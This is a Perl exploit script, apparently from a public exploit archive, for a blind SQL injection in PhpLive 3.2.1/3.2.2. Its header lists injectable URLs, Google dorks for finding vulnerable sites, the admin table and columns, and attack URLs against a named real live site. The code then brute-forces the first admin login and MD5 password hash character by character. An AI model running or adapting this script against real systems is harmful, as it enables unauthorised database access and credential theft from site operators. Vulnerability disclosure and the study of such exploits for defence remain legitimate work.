#!/usr/bin/perl

#################################################################
#################################################################
################ Original discover author banner ################
#################################################################
#################################################################
#  PhpLive 3.2.1/2 (x) Blind SQL injection                                       [_][-][X]
#      _  ___  _  ___      ___ ___ _____      __  ___ __   __  ___       
#     | |/ / || |/ __|___ / __| _ \ __\ \    / / |_  )  \ /  \/ _ \      
#     | ' <| __ | (_ |___| (__|   / _| \ \/\/ /   / / () | () \_, /      
#     |_|\_\_||_|\___|    \___|_|_\___| \_/\_/   /___\__/ \__/ /_/       
#                                                                          
#                                                                        
#      Red n'black i dress eagle on my chest.
#      It's good to be an ALBANIAN Keep my head up high for that flag i die.
#      Im proud to be an ALBANIAN
#   ###################################################################   
#       Author             : boom3rang                              
#       Contact            : boom3rang[at]live.com                         
#       Greetz       : H!tm@N - KHG - cHs
#
#          R.I.P redc00de                 
#   -------------------------------------------------------------------   
#                                             
#                  Affected software description                         
#       Software     : PhpLive                                          
#       Vendor        : http://www.phplivesupport.com                     
#       Price               : Live Support Download Starts at $89.95         
#       Version Vuln.    : v3.2.1 & v3.2.2                     
#   -------------------------------------------------------------------   
#                                             
#    [~] SQLi :                                         
#                                             
#    http://www.TARGET.com/message_box.php?theme=&l=[USERNAME]&x=[SQLi]          
#    http://www.TARGET.com/request.php?l=[USERNAME]&x=[SQLi]                      
#     
#                                                                  
#    [~]Google Dork :                                            
#   
#    Powered by PHP Live! v3.2.1                               
#    Powered by PHP Live! v3.2.2 
#    allinurl:"request.php" "deptid"                                 
#                                             
#   -------------------------------------------------------------------   
#                                             
#    [~] Table_NAME  =  chat_admin
#    [~] Column_NAME =  login - password - email - userID - name                                                                       
#   -------------------------------------------------------------------   
#                                             
#    [~] Admin Path :                                     
#                                             
#    http://www.TARGET.com/phplive   
#   -------------------------------------------------------------------                         
#    [~] Live Demo:
#   
#    http://chat.apolloservers.com/phplive/request.php?l=admin&x=1 AND 1=1    --> True
#    http://chat.apolloservers.com/phplive/request.php?l=admin&x=1 AND 1=2    --> False
#
#   -------------------------------------------------------------------
#
#    [~] ASCII
#
#  /**/and/**/ascii(substring((select/**/concat(login,0x3a,password)/**/from/**/chat_admin/**/limit/**/1,1),1,1))>100
#
#   -------------------------------------------------------------------
#   
#    [~] Live Demo ASCII
#
#      True
#   http://chat.apolloservers.com/phplive/request.php?l=admin&x=1/**/and/**/ascii(substring((select/**/concat(login,0x3a,password)/**/from/**/chat_admin/**/limit/**/1,1),1,1))>48       
#     
#      False
#   http://chat.apolloservers.com/phplive/request.php?l=admin&x=1/**/and/**/ascii(substring((select/**/concat(login,0x3a,password)/**/from/**/chat_admin/**/limit/**/1,1),1,1))>127              
#                     

###########################
###########################
# Modified version banner #
###########################
###########################

# Author: skys
# Contact: skysbsb[at]gmail.com
# This script uses the PhpLive Blind Sql Injection (found by boom3rang) to recover first user login and MD5 password!
# The result of this script is like:
# admin:890f37d479270aea39ae0e156bbd9001


####################
# EDIT THESE LINES #
####################

# Edit this address acording to the php live path
$address = "http://www.site.com/phplive";

###############################
# DO NOT EDIT BELOW THIS LINE #
###############################

use IO::Socket::INET;
use HTTP::Request;
use LWP::UserAgent;

@site = ($address."/request.php?l=agenciawiv&x=1/**/and/**/ascii%28substring%28%28select/**/concat%28login,0x3a,password%29/**/from/**/chat_admin/**/limit/**/1,1%29,", ",1%29%29=");

$base64str = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";


$tudo = "";
$foundcolon = 0;


for($i=1;$i<=100;$i++) {
    $found = 0;

    if($foundcolon == 0) {
        for($x=32;$x<=127;$x++) {
            $url = $site[0].$i.$site[1].$x;
            print "Testing pass index $i: character ".chr($x)."($x)\n";
            $resp = query($url);
            if($resp =~ m/deptid/i) {
                print "Found i($i): ".chr($x)."($x)\n";
                $tudo .= chr($x);
                print "All: $tudo\n";
                $found = 1;
                if($x == 0x3a) {
                    $foundcolon = 1;
                }
                last;
            }
        }
    } else {
        for($x=0;$x<length($base64str);$x++) {
            $url = $site[0].$i.$site[1].ord(substr($base64str, $x, 1));
            print "Testing pass index $i: character ".ord(substr($base64str, $x, 1))."(".substr($base64str, $x, 1).")\n";
            $resp = query($url);
            if($resp =~ m/deptid/i) {
                print "Found i($i): ".substr($base64str, $x, 1)."(".ord(substr($base64str, $x, 1)).")\n";
                $tudo .= substr($base64str, $x, 1);
                print "All: $tudo\n";
                $found = 1;
                last;
            }
        }
    }

    if($found == 0) {
        print "Not found char index $i! End of md5 hash? :-)\n";
        last;
    }
}

print "login:md5: $tudo\n";
exit;

sub query() {
    $link = $_[0];
    my $req = HTTP::Request->new( GET => $link );
    my $ua = LWP::UserAgent->new();
    my $response = $ua->request($req);
    return $response->content;
}

# milw0rm.com [2009-07-24]
